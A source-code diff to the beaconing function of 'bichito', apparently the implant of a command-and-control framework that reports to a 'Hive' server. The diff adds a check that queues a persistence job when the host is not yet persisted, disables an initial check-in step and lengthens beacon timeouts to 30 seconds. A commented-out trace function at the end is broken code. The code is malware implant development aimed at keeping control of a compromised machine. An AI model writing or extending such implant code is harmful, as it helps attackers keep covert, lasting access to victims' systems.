@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"bichito/modules/network"
 	"bichito/modules/biterpreter"
+	"bichito/modules/persistence"
 	"fmt"
 	"bytes"
 	"time"
@@ -25,22 +26,25 @@ func connectOut() string{
 	var error string
 		
 	//If Bid is not correct yet, send checking package again
+	//TO-DO: Remove checking??
 	if !strings.Contains(bid,"B-"){
 
 		bid = fmt.Sprintf("%s%s","B-",randomString(8))
+
+		/*
 		jobChecking := &Job{"","","",bid,"BiChecking","","","",""}
 	
 		var jobsChecking = []*Job{jobChecking}
         bufRC := new(bytes.Buffer)
         json.NewEncoder(bufRC).Encode(jobsChecking)
 		resultRP := bufRC.String()
-
+		*/
 	
 		//Prepare Authentication with Bid for next Connections
 		biauth := BiAuth{bid,biconfig.Token}
 		bufRP := new(bytes.Buffer)
 		json.NewEncoder(bufRP).Encode(biauth)
-		resultRP = bufRP.String()
+		resultRP := bufRP.String()
 		authbearer = resultRP
 		authbearer = strings.TrimSuffix(authbearer, "\n")
 
@@ -66,9 +70,32 @@ func connectOut() string{
 		sysinfo = true
 	}
 
+	if !persisted{
+		
+		errorP1,alreadyP := persistence.CheckPersistence(biconfig.Persistence)
+		if errorP1{
+			addLog("Check Persistence error:"+alreadyP)
+		}
+
+		//Debug
+		//fmt.Println("Is Persisted?"+alreadyP)
+
+		if (alreadyP != "Persisted"){
+
+			jobsysinfo := &Job{"","","",bid,"persistence","","Processing","",""}
+
+			jobsToHive.mux.Lock()
+			jobsToHive.Jobs = append(jobsToHive.Jobs,jobsysinfo)
+			jobsToHive.mux.Unlock()
+
+		}else{
+			persisted = true
+		}
+	}
+
 	//5 sec Timeout to perform Job retrieve
 	var retrieveError string
-	retrieveTimeout := time.NewTimer(time.Duration(5) * time.Second)
+	retrieveTimeout := time.NewTimer(time.Duration(30) * time.Second)
 	retrieveErr := make(chan string, 1)
 	retrieveCont := make(chan string, 1)
 
@@ -117,7 +144,7 @@ func connectOut() string{
 
 	//5 sec Timeout to perform Job Sending
 	var sendError string
-	sendTimeout := time.NewTimer(time.Duration(5) * time.Second)
+	sendTimeout := time.NewTimer(time.Duration(30) * time.Second)
 	sendErr := make(chan string, 1)
 	sendCont := make(chan string, 1)
 
@@ -152,3 +179,16 @@ func connectOut() string{
 
 	return "Success"
 }
+
+/*
+//Prepare a Job to add a trace on Hive DB
+go func sendTrace(trace string){
+
+		jobtrace := &Job{"","","",bid,"trace","","Success",trace,""}
+
+		jobsToHive.mux.Lock()
+		jobsToHive.Jobs = append(jobsToHive.Jobs,jobsysinfo)
+		jobsToHive.mux.Unlock()
+
+}
+*/
